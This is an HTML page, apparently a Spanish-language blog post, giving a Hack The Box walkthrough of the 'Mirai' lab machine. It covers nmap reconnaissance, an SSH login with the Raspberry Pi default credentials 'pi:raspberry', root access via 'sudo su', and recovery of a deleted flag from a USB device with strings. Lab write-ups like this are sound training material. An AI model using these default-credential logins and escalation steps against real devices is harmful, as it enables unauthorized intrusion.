@@ -1,0 +1,668 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Mirai - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Mirai en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Mirai">
+<meta property="og:url" content="http://localhost:4000/htb-mirai/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Mirai en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-mirai/mirai.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-11-27T00:00:00-06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-mirai/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Artículos</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categorías</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Etiquetas</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/buscador/">Buscador</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">Contacto</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Mirai</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Intelligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Mirai">
+    <meta itemprop="description" content="Resolución de la máquina Mirai en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="November 27, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Mirai
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-11-27T00:00:00-06:00">November 27, 2021 </time> 
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-mirai/banner-mirai.jpg" alt=""></p>
+
+<h2 id="mirai">Mirai</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.48.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.48
+PING 10.10.10.48 <span class="o">(</span>10.10.10.48<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.48: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>137 ms
+
+<span class="nt">---</span> 10.10.10.48 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 136.993/136.993/136.993/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.48 <span class="nt">-oG</span> allPorts
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-27 14:05 CST
+Initiating Ping Scan at 14:05
+Scanning 10.10.10.48 <span class="o">[</span>4 ports]
+Completed Ping Scan at 14:05, 0.16s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
+Initiating SYN Stealth Scan at 14:05
+Scanning 10.10.10.48 <span class="o">[</span>65535 ports]
+Discovered open port 53/tcp on 10.10.10.48
+Discovered open port 80/tcp on 10.10.10.48
+Discovered open port 22/tcp on 10.10.10.48
+Discovered open port 1195/tcp on 10.10.10.48
+Discovered open port 32400/tcp on 10.10.10.48
+Discovered open port 32469/tcp on 10.10.10.48
+Completed SYN Stealth Scan at 14:06, 39.69s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.48
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65529 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+PORT      STATE SERVICE
+22/tcp    open  ssh
+53/tcp    open  domain
+80/tcp    open  http
+1195/tcp  open  rsf-1
+32400/tcp open  plex
+32469/tcp open  unknown
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>40.01 seconds
+           Raw packets sent: 68248 <span class="o">(</span>3.003MB<span class="o">)</span> | Rcvd: 68201 <span class="o">(</span>2.728MB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬───────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼───────────────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.48
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,53,80,1195,32400,32469
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p22</span>,53,80,1195,32400,32469 10.10.10.48 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-27 14:08 CST
+Nmap scan report <span class="k">for </span>10.10.10.48
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 <span class="o">(</span>DSA<span class="o">)</span>
+|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 <span class="o">(</span>ED25519<span class="o">)</span>
+53/tcp    open  domain  dnsmasq 2.76
+| dns-nsid: 
+|_  bind.version: dnsmasq-2.76
+80/tcp    open  http    lighttpd 1.4.35
+|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=UTF-8).
+|_http-server-header: lighttpd/1.4.35
+1195/tcp  open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
+32400/tcp open  http    Plex Media Server httpd
+|_http-favicon: Plex
+|_http-title: Unauthorized
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Server returned status 401 but no WWW-Authenticate header.
+|_http-cors: HEAD GET POST PUT DELETE OPTIONS
+32469/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.08 seconds
+</span></code></pre></div></div>
+
+<p>Vamos a empezar analizando los servicio HTTP y vemos los puertos 80 y 32400; así que antes de ver vía web vamos a usar <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.48/
+http://10.10.10.48/ <span class="o">[</span>404 Not Found] Country[RESERVED][ZZ], HTTPServer[lighttpd/1.4.35], IP[10.10.10.48], UncommonHeaders[x-pi-hole], lighttpd[1.4.35]
+❯ whatweb http://10.10.10.48:32400/
+http://10.10.10.48:32400/ <span class="o">[</span>401 Unauthorized] Country[RESERVED][ZZ], IP[10.10.10.48], Script, Title[Unauthorized], UncommonHeaders[x-plex-protocol,x-plex-content-original-length,x-plex-content-compressed-length]
+</code></pre></div></div>
+
+<p>Ahora vamos a tratar de ver el contenido vía web y tenemos que para el puerto 80 no se observa nada y sobre el 32400 tenemos el servicio Plex, del cual si buscamos un poco, vemos que no presenta credenciales por defecto.</p>
+
+<p><img src="/assets/images/htb-mirai/mirai-web.png" alt=""></p>
+
+<p>Como por el puerto 80 no observamos nada, podríamos pensar que se está aplicando <em>virtual hosting</em>, así que de acuerdo con la plataforma HackTheBox, podríamos tratar de agregar al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>  el dominio <code class="language-plaintext highlighter-rouge">mira.htb</code> y trataremos de visualizar la web nuevamente.</p>
+
+<p><img src="/assets/images/htb-mirai/mirai-web1.png" alt=""></p>
+
+<p>Ahora si nos muestra contenido y algo curioso, un banner indicando que <strong><em>If you have an ongoing use for this website, please ask the owner of the Pi-hole in your network to have it whitelisted.</em></strong>, traduciendo: <strong><em>Si tiene un uso continuo de este sitio web, solicite al propietario del Pi-hole en su red que lo incluya en la lista blanca.</em></strong>. Aqui nos está indicando que se trata de la aplicación <strong>Pi-hole</strong> la cual se utiliza para el bloqueo de anuncios y rastreadores en Internet a nivel de red en Linux y que actúa como un sumidero de DNS, destinado para su uso en una red privada.</p>
+
+<p>Si buscamos un poco sobre <strong>Pi-hole</strong>, encontraremos que se encuentra asociada a una <strong>raspberry</strong>, por lo que existen credenciales default de acceso por ssh, las cuales son <code class="language-plaintext highlighter-rouge">pi : raspberry</code>. Asi que vamos a tratar de acceder por ssh a ver si tenemos suerte.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh pi@10.10.10.48
+The authenticity of host <span class="s1">'10.10.10.48 (10.10.10.48)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:UkDz3Z1kWt2O5g2GRlullQ3UY/cVIx/oXtiqLPXiXMY.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.10.48<span class="s1">' (ECDSA) to the list of known hosts.
+pi@10.10.10.48'</span>s password: 
+
+The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
+individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Aug 27 14:47:50 2017 from localhost
+
+SSH is enabled and the default password <span class="k">for </span>the <span class="s1">'pi'</span> user has not been changed.
+This is a security risk - please login as the <span class="s1">'pi'</span> user and <span class="nb">type</span> <span class="s1">'passwd'</span> to <span class="nb">set </span>a new password.
+
+
+SSH is enabled and the default password <span class="k">for </span>the <span class="s1">'pi'</span> user has not been changed.
+This is a security risk - please login as the <span class="s1">'pi'</span> user and <span class="nb">type</span> <span class="s1">'passwd'</span> to <span class="nb">set </span>a new password.
+
+pi@raspberrypi:~ <span class="nv">$ </span><span class="nb">whoami
+</span>pi
+pi@raspberrypi:~ <span class="err">$</span>
+</code></pre></div></div>
+
+<p>Ya nos encontramos dentro de la máquina y podemos visualizar la flag (user.txt). Ahora vamos a tratar de escalar privilegios, por lo que vamos a enumrar un poco el sistema.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pi@raspberrypi:~/Desktop <span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>pi<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>pi<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>pi<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,20<span class="o">(</span>dialout<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,60<span class="o">(</span>games<span class="o">)</span>,100<span class="o">(</span><span class="nb">users</span><span class="o">)</span>,101<span class="o">(</span>input<span class="o">)</span>,108<span class="o">(</span>netdev<span class="o">)</span>,117<span class="o">(</span>i2c<span class="o">)</span>,998<span class="o">(</span>gpio<span class="o">)</span>,999<span class="o">(</span>spi<span class="o">)</span>
+pi@raspberrypi:~/Desktop <span class="err">$</span>
+</code></pre></div></div>
+
+<p>Nos encontramos dentro del grupo <code class="language-plaintext highlighter-rouge">sudo</code>, por lo que ya podemos ser el usuario <strong>root</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pi@raspberrypi:~/Desktop <span class="nv">$ </span><span class="nb">sudo </span>su
+root@raspberrypi:/home/pi/Desktop# <span class="nb">whoami
+</span>root
+root@raspberrypi:/home/pi/Desktop# 
+</code></pre></div></div>
+
+<p>A este punto podriamos tratar de visualizar la flag (root.txt), pero al hacer, nos aparece una leyenda.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@raspberrypi:/home/pi/Desktop# <span class="nb">cd</span> /root/
+root@raspberrypi:~# <span class="nb">ls</span> <span class="nt">-l</span>
+total 4
+<span class="nt">-rw-r--r--</span> 1 root root 76 Aug 14  2017 root.txt
+root@raspberrypi:~# <span class="nb">cat </span>root.txt 
+I lost my original root.txt! I think I may have a backup on my USB stick...
+root@raspberrypi:~#
+</code></pre></div></div>
+
+<p>Nos indica que la flag original se encuentra dentro de una USB stick; por lo que vamos a validar si se tiene una USB conectada al equipo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@raspberrypi:~# <span class="nb">df</span> <span class="nt">-h</span>
+Filesystem      Size  Used Avail Use% Mounted on
+aufs            8.5G  2.8G  5.3G  34% /
+tmpfs           100M  4.8M   96M   5% /run
+/dev/sda1       1.3G  1.3G     0 100% /lib/live/mount/persistence/sda1
+/dev/loop0      1.3G  1.3G     0 100% /lib/live/mount/rootfs/filesystem.squashfs
+tmpfs           250M     0  250M   0% /lib/live/mount/overlay
+/dev/sda2       8.5G  2.8G  5.3G  34% /lib/live/mount/persistence/sda2
+devtmpfs         10M     0   10M   0% /dev
+tmpfs           250M  8.0K  250M   1% /dev/shm
+tmpfs           5.0M  4.0K  5.0M   1% /run/lock
+tmpfs           250M     0  250M   0% /sys/fs/cgroup
+tmpfs           250M  8.0K  250M   1% /tmp
+/dev/sdb        8.7M   93K  7.9M   2% /media/usbstick
+tmpfs            50M     0   50M   0% /run/user/999
+tmpfs            50M     0   50M   0% /run/user/1000
+root@raspberrypi:~# 
+</code></pre></div></div>
+
+<p>Vemos una montura bajo la ruta <code class="language-plaintext highlighter-rouge">/media/usbstick</code> asi que vamos a echarle un ojo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@raspberrypi:~# <span class="nb">cd</span> /media/usbstick
+root@raspberrypi:/media/usbstick# <span class="nb">ls</span> <span class="nt">-l</span>
+total 13
+<span class="nt">-rw-r--r--</span> 1 root root   129 Aug 14  2017 damnit.txt
+drwx------ 2 root root 12288 Aug 14  2017 lost+found
+root@raspberrypi:/media/usbstick# <span class="nb">cat </span>damnit.txt 
+Damnit! Sorry man I accidentally deleted your files off the USB stick.
+Do you know <span class="k">if </span>there is any way to get them back?
+
+<span class="nt">-James</span>
+root@raspberrypi:/media/usbstick# 
+</code></pre></div></div>
+
+<p>Tenemos un mensaje de <strong>James</strong> quien nos dice que accidentalmente borró los archivos dentro de la USB. En este punto, podríamos tratar de obsevar el histórico bajo la partición asociada a la USB:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@raspberrypi:/media/usbstick# strings /dev/sdb
+<span class="o">&gt;</span>r &amp;
+/media/usbstick
+lost+found
+root.txt
+damnit.txt
+<span class="o">&gt;</span>r &amp;
+<span class="o">&gt;</span>r &amp;
+/media/usbstick
+lost+found
+root.txt
+damnit.txt
+<span class="o">&gt;</span>r &amp;
+/media/usbstick
+2]8^
+lost+found
+root.txt
+damnit.txt
+<span class="o">&gt;</span>r &amp;
+3d3e4831
+Damnit! Sorry man I accidentally deleted your files off the USB stick.
+Do you know <span class="k">if </span>there is any way to get them back?
+<span class="nt">-James</span>
+root@raspberrypi:/media/usbstick#
+</code></pre></div></div>
+
+<p>De esta forma ya podríamos visualizar la flag (root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#pi-hole" class="page__taxonomy-item" rel="tag">Pi-hole</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#raspberry" class="page__taxonomy-item" rel="tag">Raspberry</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-11-27T00:00:00-06:00">November 27, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/portScan/" class="pagination--pager" title="Archivo portScan
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">© 2021 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
